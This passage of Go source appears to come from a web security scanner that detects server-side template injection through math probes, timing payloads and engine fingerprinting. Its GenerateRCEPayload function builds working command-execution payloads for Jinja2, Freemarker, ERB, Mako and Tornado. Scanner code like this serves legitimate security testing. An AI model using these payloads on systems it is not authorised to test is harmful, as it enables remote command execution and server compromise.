			Template:    fmt.Sprintf("${__import__('time').sleep(%d)}", sleepSeconds),
			Engine:      EngineMako,
			Type:        PayloadBlind,
			Description: "Mako blind time-based",
			Severity:    finding.High,
		},
	}
}

func (d *Detector) measureResponseTime(ctx context.Context, targetURL *url.URL, parameter, value string) (time.Duration, error) {
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, value)
	testURL.RawQuery = query.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return 0, err
	}

	req.Header.Set("User-Agent", d.config.UserAgent)

	start := time.Now()
	resp, err := d.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	return time.Since(start), nil
}

// getBaselineBody fetches a response with a benign parameter value
// to compare against payload responses and avoid false positives.
func (d *Detector) getBaselineBody(ctx context.Context, targetURL *url.URL, parameter string) string {
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, "waftester_baseline_probe")
	testURL.RawQuery = query.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return ""
	}

	req.Header.Set("User-Agent", d.config.UserAgent)
	for key, values := range d.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}
	for _, cookie := range d.config.Cookies {
		req.AddCookie(cookie)
	}

	resp, err := d.client.Do(req)
	if err != nil {
		return ""
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil {
		return ""
	}
	return string(body)
}

// FingerprintEngine attempts to identify the template engine being used
func (d *Detector) FingerprintEngine(ctx context.Context, targetURL string, parameter string) (TemplateEngine, error) {
	// Use fingerprinting payloads that have unique outputs per engine
	fingerprints := map[string]TemplateEngine{
		// Jinja2/Twig specific
		"{{7*'7'}}": EngineJinja2, // Returns "7777777" in Jinja2, error in Twig

		// Twig specific
		"{{_self.env.registerUndefinedFilterCallback('id')}}": EngineTwig,

		// Smarty specific
		"{$smarty.version}": EngineSmarty,

		// Freemarker specific
		"${.data_model}": EngineFreemarker,
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return EngineUnknown, err
	}

	for payload, engine := range fingerprints {
		testURL := *parsedURL
		query := testURL.Query()
		query.Set(parameter, payload)
		testURL.RawQuery = query.Encode()

		req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", d.config.UserAgent)

		resp, err := d.client.Do(req)
		if err != nil {
			continue
		}

		body, err := iohelper.ReadBodyDefault(resp.Body)
		iohelper.DrainAndClose(resp.Body) // Close immediately, not defer in loop

		if err != nil {
			continue
		}

		// Engine-specific response analysis
		switch engine {
		case EngineJinja2:
			if strings.Contains(string(body), "7777777") {
				return EngineJinja2, nil
			}
		case EngineSmarty:
			if regexp.MustCompile(`Smarty[_\-]?[0-9]`).MatchString(string(body)) {
				return EngineSmarty, nil
			}
		}
	}

	return EngineUnknown, nil
}

// GetEnginePayloads returns payloads for a specific engine
func GetEnginePayloads(engine TemplateEngine, safeOnly bool) []*Payload {
	d := NewDetector(&DetectorConfig{SafeMode: safeOnly})
	return d.GetPayloads(engine, "")
}

// AllEngines returns a list of all supported template engines
func AllEngines() []TemplateEngine {
	return []TemplateEngine{
		EngineJinja2,
		EngineTwig,
		EngineFreemarker,
		EngineVelocity,
		EngineSmarty,
		EngineMako,
		EngineERB,
		EnginePebble,
		EngineThymeleaf,
		EngineNunjucks,
		EngineHandlebars,
		EngineMustache,
		EngineTornado,
		EngineDjango,
		EngineRazor,
	}
}

// PayloadGenerator generates custom SSTI payloads
type PayloadGenerator struct {
	engine TemplateEngine
}

// NewPayloadGenerator creates a new payload generator for a specific engine
func NewPayloadGenerator(engine TemplateEngine) *PayloadGenerator {
	return &PayloadGenerator{engine: engine}
}

// GenerateMathPayload generates a math-based detection payload
func (g *PayloadGenerator) GenerateMathPayload(a, b int) *Payload {
	result := a * b
	resultStr := fmt.Sprintf("%d", result)

	var template string
	switch g.engine {
	case EngineJinja2, EngineTwig, EngineNunjucks, EngineTornado:
		template = fmt.Sprintf("{{%d*%d}}", a, b)
	case EngineFreemarker, EngineMako:
		template = fmt.Sprintf("${%d*%d}", a, b)
	case EngineSmarty:
		template = fmt.Sprintf("{%d*%d}", a, b)
	case EngineERB:
		template = fmt.Sprintf("<%%= %d*%d %%>", a, b)
	case EngineThymeleaf:
		template = fmt.Sprintf("[[${%d*%d}]]", a, b)
	case EngineRazor:
		template = fmt.Sprintf("@(%d*%d)", a, b)
	default:
		template = fmt.Sprintf("{{%d*%d}}", a, b)
	}

	return &Payload{
		Template:       template,
		Engine:         g.engine,
		Type:           PayloadMath,
		ExpectedOutput: resultStr,
		Description:    fmt.Sprintf("Custom math payload for %s", g.engine),
		Severity:       finding.High,
		MathA:          a,
		MathB:          b,
		MathResult:     result,
	}
}

// GenerateRCEPayload generates an RCE payload (use with caution)
func (g *PayloadGenerator) GenerateRCEPayload(command string) *Payload {
	var template string
	switch g.engine {
	case EngineJinja2:
		template = fmt.Sprintf("{{lipsum.__globals__['os'].popen('%s').read()}}", command)
	case EngineFreemarker:
		template = fmt.Sprintf(`${"freemarker.template.utility.Execute"?new()("%s")}`, command)
	case EngineERB:
		template = fmt.Sprintf("<%%= `%s` %%>", command)
	case EngineMako:
		template = fmt.Sprintf("${__import__('os').popen('%s').read()}", command)
	case EngineTornado:
		template = fmt.Sprintf("{%%import os%%}{{os.popen('%s').read()}}", command)
	default:
		return nil
	}

	return &Payload{
		Template:    template,
		Engine:      g.engine,
		Type:        PayloadRCE,
		Description: fmt.Sprintf("RCE payload executing: %s", command),
		Severity:    finding.Critical,
	}
}

// Result represents the overall SSTI detection result
type Result struct {
	URL             string           `json:"url"`
	Parameters      []string         `json:"parameters_tested"`
	Vulnerabilities []*Vulnerability `json:"vulnerabilities"`
	DetectedEngine  TemplateEngine   `json:"detected_engine,omitempty"`
	Duration        time.Duration    `json:"duration"`
	PayloadsTested  int              `json:"payloads_tested"`
}

// ScanURL performs comprehensive SSTI scanning on a URL
func (d *Detector) ScanURL(ctx context.Context, targetURL string, parameters []string) (*Result, error) {
	start := time.Now()
	result := &Result{
		URL:        targetURL,
		Parameters: parameters,
	}

	var allVulns []*Vulnerability

	for _, param := range parameters {
		// Try to fingerprint engine first
		engine, _ := d.FingerprintEngine(ctx, targetURL, param)
		if engine != EngineUnknown {
			result.DetectedEngine = engine
		}

		// Standard detection
		vulns, err := d.Detect(ctx, targetURL, param)
		if err != nil {
			continue
		}
		allVulns = append(allVulns, vulns...)

		// Blind detection
		if !d.config.SafeMode {
			blindVulns, err := d.DetectBlind(ctx, targetURL, param)
			if err == nil {
				allVulns = append(allVulns, blindVulns...)
			}
		}
	}

	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)
	result.PayloadsTested = len(d.getFilteredPayloads()) * len(parameters)

	return result, nil
}
